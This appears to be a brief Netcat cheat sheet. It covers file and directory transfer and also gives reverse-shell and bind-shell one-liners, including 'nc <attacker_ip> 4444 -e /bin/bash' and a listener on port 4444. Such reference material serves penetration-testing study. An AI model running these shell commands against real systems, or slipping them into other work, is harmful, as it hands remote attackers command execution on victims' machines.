**Netcat**  is a command-line tool used for network communication, debugging and file transfers. It supports TCP, UDP, and various advanced features.

## Reverse Shell

- **On Attacker's Machine (Listener)**
```bash
nc -lvnp 4444
```

- **On Target Machine**
```bash
nc <attacker_ip> 4444 -e /bin/bash
```

> **Note:** The `-e` flag enables the execution of commands, but it might be disabled in modern versions of Netcat. Use a compatible version or alternative methods if necessary.

## Bind Shell

- **On Target Machine**

```bash
nc -l -p 4444 -e /bin/bash
```

- **On Attacker's Machine**
```bash
nc <target_ip> 4444
```

## File Transfer

- **Sending a File**
```bash
# Sender
nc -l -p 1234 < file_to_send
```

- **Receiving a File**
```bash
# Receiver
nc <sender_ip> 1234 > received_file
```

## Transferring Directories

To transfer a directory, compress it first, then use Netcat for transfer:
- **Sender**
```bash
tar -cf - directory_to_send | nc -l -p 1234
```

- **Receiver**
```bash
# Receiver
nc <sender_ip> 1234 | tar -xf -
```
